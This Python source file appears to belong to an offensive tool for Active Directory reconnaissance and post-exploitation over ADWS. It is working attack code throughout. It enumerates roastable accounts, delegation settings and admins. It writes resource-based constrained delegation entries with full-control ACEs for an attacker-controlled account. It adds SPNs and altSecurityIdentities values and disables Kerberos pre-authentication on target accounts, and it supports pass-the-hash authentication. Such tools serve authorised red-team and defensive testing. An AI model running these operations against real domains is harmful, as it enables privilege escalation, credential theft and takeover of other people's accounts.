import argparse
import logging
import sys
from base64 import b64decode, b64encode

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)

from src.adws import ADWSConnect, NTLMAuth
from src.soap_templates import NAMESPACES


# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L180
def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = LDAP_SID()
    # BUILTIN\Administrators
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


# https://github.com/fortra/impacket/blob/829239e334fee62ace0988a0cb5284233d8ec3c4/examples/rbcd.py#L200
def _create_allow_ace(sid: LDAP_SID):
    nace = ACE()
    nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551  # Full control
    acedata["Sid"] = sid.getData()
    nace["Ace"] = acedata
    return nace

def getAccountDN(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
):
    """Get an LDAP objects distinguishedName attribute to be used in write operations

    Args:
        target (str): target samAccountName
        username (str): user to authenticate as
        ip (str): the ip of the domain controller
        domain (str): the domain name
        auth (NTLMAuth): authentication method
    """

    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "distinguishedname",
    ]

    pull_et = pull_client.pull(query=get_account_query, basedn=None, attributes=attributes)

    for item in pull_et.findall(".//addata:user", namespaces=NAMESPACES):
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )
    dn = distinguishedName_elem.text

    return dn


def set_array_attribute(
    target: str,
    attr: str,
    value: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Set a value in AD attribute that has isSingleValued=False
        (e.g. servicePrincipalName, altSecurityIdentities).
        Appends value to the attribute rather than replacing.

    Args:
        target (str): target samAccountName
        attr (str): name of attribute to modify
        value (str): value to append to the target's attribute
        username (str): user to authenticate as
        ip (str): the ip of the domain controller
        auth (NTLMAuth): authentication method
        remove (bool): Whether to remove the value
    """

    dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)
    
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    
    put_client.put(
        object_ref=dn,
        operation="add" if not remove else "delete",
        attribute=f"addata:{attr}",
        data_type="string",
        value=value,
    )
        
    print(
        f"[+] {attr} {value} {'removed' if remove else 'written'} successfully on {target}!"
    )

def set_asrep(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Set the DONT_REQ_PREAUTH (0x400000) flag on the target accounts
    userAccountControl attribute. 

    Args:
        target (str): target samAccountName
        username (str): user to authenticate as
        ip (str): the ip of the domain controller
        auth (NTLMAuth): authentication method
        remove (bool): Whether to remove the value
    """
    
    """First get current userAccountControl value"""
    get_accounts_queries = f"(sAMAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "userAccountControl",
        "distinguishedName",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    for item in pull_et.findall(".//addata:user", namespaces=NAMESPACES):
        uac = item.find(
            ".//addata:userAccountControl/ad:value",
            namespaces=NAMESPACES,   
        )
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )
    
    dn = distinguishedName_elem.text
    
    """Then write"""
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    if not remove:
        newUac = int(uac.text) | 0x400000

        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=newUac,
        )

    else:
        newUac = int(uac.text) & ~0x400000
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=newUac,
        )
    
    print(
        f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!"
    )

def set_rbcd(
    target: str,
    account: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """Write RBCD. Safe, appends to the attribute rather than
    replacing. Pass the remove param to remove the account sid from the
    target security descriptor

    Args:
        target (str): target samAccountName
        account (str): attacker controlled samAccountName
        username (str): user to authenticate as
        ip (str): the ip of the domain controller
        domain (str): specified account domain
        auth (NTLMAuth): authentication method
        remove (bool): Whether to remove the value
    """

    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"

    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    """Build attrs for RBCD computer pull"""
    attributes: list = [
        "samaccountname",
        "objectsid",
        "distinguishedname",
        "msds-allowedtoactonbehalfofotheridentity",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)

    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn: str = ""
    account_sid: LDAP_SID | None = None

    for item in pull_et.findall(".//addata:computer", namespaces=NAMESPACES):
        sam_name_elem = item.find(
            ".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES
        )
        sd_elem = item.find(
            ".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value",
            namespaces=NAMESPACES,
        )
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )

        sam_name = sam_name_elem.text if sam_name_elem != None else ""
        sid = sid_elem.text if sid_elem != None else ""
        sd = sd_elem.text if sd_elem != None else ""
        dn = distinguishedName_elem.text if distinguishedName_elem != None else ""

        if sam_name and sid and sam_name.casefold() == account.casefold():
            account_sid = LDAP_SID(data=b64decode(sid))
        if dn and sam_name and sam_name.casefold() == target.casefold():
            target_dn = dn
            if sd:
                target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd))

    if not account_sid:
        logging.critical(
            f"Unable to find {target} or {account}."
        )
        raise SystemExit()

    # collect a clean list.  remove the account sid if its present
    target_sd["Dacl"].aces = [
        ace
        for ace in target_sd["Dacl"].aces
        if ace["Ace"]["Sid"].formatCanonical() != account_sid.formatCanonical()
    ]
    if not remove:
        target_sd["Dacl"].aces.append(_create_allow_ace(account_sid))

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(
        object_ref=target_dn,
        operation="replace",
        attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
        data_type="base64Binary",
        value=b64encode(target_sd.getData()).decode("utf-8"),
    )

    # if we are removing and the list of aces is empty, just delete the attribute
    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(
            object_ref=target_dn,
            operation="delete",
            attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
            data_type="base64Binary",
            value=b64encode(target_sd.getData()).decode("utf-8"),
        )

    print(
        f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} successfully!"
    )
    print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")


def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝ 
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝  
███████║╚██████╔╝██║  ██║██║        ██║   
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝   

@_logangoins
github.com/jlevere  
          """)

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Perform AD reconnaisance and post-exploitation through ADWS from Linux ",
    )
    parser.add_argument(
        "connection",
        action="store",
        help="domain/username[:password]@<targetName or address>",
    )
    parser.add_argument(
        "--debug", 
        action="store_true", 
        help="Turn DEBUG output ON"
    )
    parser.add_argument(
        "--ts", 
        action="store_true", 
        help="Adds timestamp to every logging output."
    )
    parser.add_argument(
        "-H", "--hash",
        action="store",
        metavar="nthash",
        help="Use an NT hash for authentication",
    )

    enum = parser.add_argument_group('Enumeration')
    enum.add_argument(
        "--users",
        action="store_true", 
        help="Enumerate user objects"
    )
    enum.add_argument(
        "--computers",
        action="store_true",
        help="Enumerate computer objects"
    )
    enum.add_argument(
        "--groups", 
        action="store_true", 
        help="Enumerate group objects"
    )
    enum.add_argument(
        "--constrained",
        action="store_true",
        help="Enumerate objects with the msDS-AllowedToDelegateTo attribute set",
    )
    enum.add_argument(
        "--unconstrained",
        action="store_true",
        help="Enumerate objects with the TRUSTED_FOR_DELEGATION flag set",
    )
    enum.add_argument(
        "--spns", 
        action="store_true", 
        help="Enumerate accounts with the servicePrincipalName attribute set"
    )
    enum.add_argument(
        "--asreproastable", 
        action="store_true", 
        help="Enumerate accounts with the DONT_REQ_PREAUTH flag set"
    )
    enum.add_argument(
        "--admins", 
        action="store_true", 
        help="Enumerate high privilege accounts"
    )
    enum.add_argument(
        "--rbcds", 
        action="store_true", 
        help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set"
    )
    enum.add_argument(
        "-q",
        "--query",
        action="store",
        metavar="query",
        help="Raw query to execute on the target",
    )
    enum.add_argument(
        "-f", "--filter",
        action="store",
        metavar="attr,attr,...",
        help="Attributes to select from the objects returned, in a comma seperated list",
    )
    enum.add_argument(
        "-dn", "--distinguishedname",
        action="store",
        metavar="distinguishedname",
        help="The root objects distinguishedName for the query",
    )
    enum.add_argument(
        "-p", "--parse",
        action="store_true",
        help="Parse attributes to human readable format",
    )

    writing = parser.add_argument_group('Writing')
    writing.add_argument(
        "--rbcd",
        action="store",
        metavar="source",
        help="Operation to write or remove RBCD. Also used to pass in the source computer account used for the attack.",
    )
    writing.add_argument(
        "--altsecid",
        action="store",
        metavar="value",
        help='Operation to write the altSecurityIdentities attribute value, writes by default unless "--remove" is specified',
    )
    writing.add_argument(
        "--spn",
        action="store",
        metavar="value",
        help='Operation to write the servicePrincipalName attribute value, writes by default unless "--remove" is specified',
    )
    writing.add_argument(
        "--asrep",
        action="store_true",
        help="Operation to write the DONT_REQ_PREAUTH (0x400000) userAccountControl flag on a target object"
    )
    writing.add_argument(
        "--account",
        action="store",
        metavar="account",
        help="Account to preform an operation on",
    )
    writing.add_argument(
        "--remove",
        action="store_true",
        help="Operarion to remove an attribute value based off an operation",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)

    if domain is None:
        domain = ""

    # if there are no supplied auth information, ask for a password interactivly
    if password == "" and username != "" and options.hash is None:
        from getpass import getpass

        password = getpass("Password:")

    queries: dict[str, str] = {
        "users": "(&(objectClass=user)(objectCategory=person))",
        "computers": "(objectClass=computer)",
        "constrained": "(msds-allowedtodelegateto=*)",
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "asreproastable":"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "admins": "(&(objectClass=user)(adminCount=1))",
        "groups": "(objectCategory=group)",
        "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)",
    }

    """Just check if anything is specified"""
    ldap_query = []
    ldap_query.append(options.query)
    for flag, this_query in queries.items():
            if getattr(options, flag):
                ldap_query.append(this_query)

    if not domain:
        logging.critical('"domain" must be specified')
        raise SystemExit()

    if not username:
        logging.critical('"username" must be specified')
        raise SystemExit()

    auth = NTLMAuth(password=password, hashes=options.hash)
    
    if options.rbcd != None:
        if not options.account:
            logging.critical(
                '"--rbcd" must be used with "--account"'
            )
            raise SystemExit()

        set_rbcd(
            ip=remoteName,
            domain=domain,
            target=options.account,
            account=options.rbcd,
            username=username,
            auth=auth,
            remove=options.remove,
        )
    elif options.altsecid != None:
        if not options.account:
            logging.critical(
                'Please specify an account with "--account"'
            )
            raise SystemExit()
        
        set_array_attribute(
            ip=remoteName,
            domain=domain,
            target=options.account,
            attr='altSecurityIdentities',
            value=options.altsecid,
            username=username,
            auth=auth,
            remove=options.remove
        )
    elif options.spn != None:
        if not options.account:
            logging.critical(
                'Please specify an account with "--account"'
            )
            raise SystemExit()
        
        set_array_attribute(
            ip=remoteName,
            domain=domain,
            target=options.account,
            attr='servicePrincipalName',
            value=options.spn,
            username=username,
            auth=auth,
            remove=options.remove
        )
    elif options.asrep:
        if not options.account:
            logging.critical(
                'Please specify an account with "--account"'
            )
            raise SystemExit()
        
        set_asrep(
            ip=remoteName,
            domain=domain,
            target=options.account,
            username=username,
            auth=auth,
            remove=options.remove
        )
    else:
        if not ldap_query:
            logging.critical("Query can not be None")
            raise SystemExit()
       
        client = ADWSConnect.pull_client(
            ip=remoteName,
            domain=domain,
            username=username,
            auth=auth,
        )

        for current_query in ldap_query:

            if not current_query:
                continue
            """
            client = ADWSConnect.pull_client(
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )
            """

            if options.filter is not None:
                attributes: list = [x.strip() for x in options.filter.split(",")]
            else:
                attributes = None
            
            client.pull(current_query, options.distinguishedname, attributes, print_incrementally=True, parse_values=options.parse)


if __name__ == "__main__":
    run_cli()
